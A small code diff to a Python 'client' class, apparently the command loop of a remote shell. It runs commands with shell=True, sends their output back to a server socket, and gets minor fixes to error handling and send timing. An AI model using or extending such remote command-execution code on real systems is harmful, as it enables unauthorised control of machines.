@@ -45,7 +45,7 @@ class client:
             output = subprocess.check_output(cmd, shell=True)
             output = ''.join(chr(i) for i in output)
         except subprocess.CalledProcessError as error:
-            output = error
+            output = str(error)
         self.send(output)
 
     def send(self, msg):
@@ -55,7 +55,7 @@ class client:
 
         try:
             self.server.send(msg_len)
-
+            sleep(0.1)
             self.server.send(msg.encode())
         except (ConnectionResetError, ConnectionAbortedError):
             return 0
